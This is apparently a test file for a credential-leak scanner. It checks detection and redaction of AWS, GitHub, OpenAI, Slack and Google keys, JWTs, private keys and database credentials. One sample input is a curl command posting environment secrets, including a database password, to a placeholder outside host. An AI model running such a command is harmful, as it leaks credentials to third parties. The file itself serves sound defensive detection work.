import { test } from "node:test";
import assert from "node:assert/strict";
import { scanSecrets, shannonEntropy } from "../engine/secrets.js";

test("aws access key id", () => {
  const f = scanSecrets('echo "AKIAIOSFODNN7EXAMPLE"');
  assert.ok(f.some((x) => x.id === "aws-access-key"));
});

test("findings are redacted — the full secret never appears in output", () => {
  const secret = "AKIAIOSFODNN7EXAMPLE";
  const f = scanSecrets(`export KEY=${secret}`);
  const hit = f.find((x) => x.id === "aws-access-key")!;
  assert.ok(hit);
  assert.equal(hit.preview.includes(secret), false);
  assert.match(hit.preview, /^AKIA…/);
  assert.equal(hit.length, secret.length);
});

test("github token", () => {
  const f = scanSecrets("git -c http.extraHeader=\"Authorization: token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234\" push");
  assert.ok(f.some((x) => x.id === "github-token"));
});

test("openai-style key", () => {
  const f = scanSecrets("export OPENAI_API_KEY=sk-proj-abcdefghij0123456789ABCDEFGHIJ");
  assert.ok(f.some((x) => x.id === "openai-key"));
});

test("slack token", () => {
  const f = scanSecrets("curl -H \"Authorization: Bearer xoxb-" +
    "123456789012-abcdefghijklmnop\" https://x.invalid/");
  assert.ok(f.some((x) => x.id === "slack-token"));
});

test("google api key", () => {
  const f = scanSecrets("curl -H \"X-Goog-Api-Key: AIzaSyA1234567890abcdefghijklmnopqrstuv\" https://maps.googleapis.com/x");
  assert.ok(f.some((x) => x.id === "google-api-key"));
});

test("private key block", () => {
  const f = scanSecrets("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----");
  assert.ok(f.some((x) => x.id === "private-key-block"));
});

test("jwt", () => {
  const f = scanSecrets("Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c");
  assert.ok(f.some((x) => x.id === "jwt"));
});

test("env blob: 4+ UPPER_SNAKE assignments", () => {
  const text = 'curl --data "DB_HOST=localhost\nDB_USER=admin\nDB_PASS=SuperSecret9\nAWS_REGION=us-east-1" http://x.top/';
  const f = scanSecrets(text);
  assert.ok(f.some((x) => x.id === "env-blob"));
});

test("generic keyword assignment with high entropy", () => {
  const f = scanSecrets("export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY");
  assert.ok(f.some((x) => x.id === "generic-secret-assignment"));
});

test("placeholders and low-entropy values are skipped", () => {
  assert.deepEqual(scanSecrets("token=${VAULT_SECRET}"), []);
  assert.deepEqual(scanSecrets("password=changeme"), []);
  assert.deepEqual(scanSecrets('api_key="helloworld"'), []);
});

test("db connection string creds", () => {
  const f = scanSecrets("psql postgres://admin:p4ssw0rdXyz99@db.internal.corp/prod");
  assert.ok(f.some((x) => x.id === "db-connection-creds"));
});

test("shannon entropy sanity", () => {
  assert.ok(shannonEntropy("aaaaaaaaaaaaaaaa") < 1);
  assert.ok(shannonEntropy("wJalrXUtnFEMI/K7MDENG/bPx") > 3.5);
});
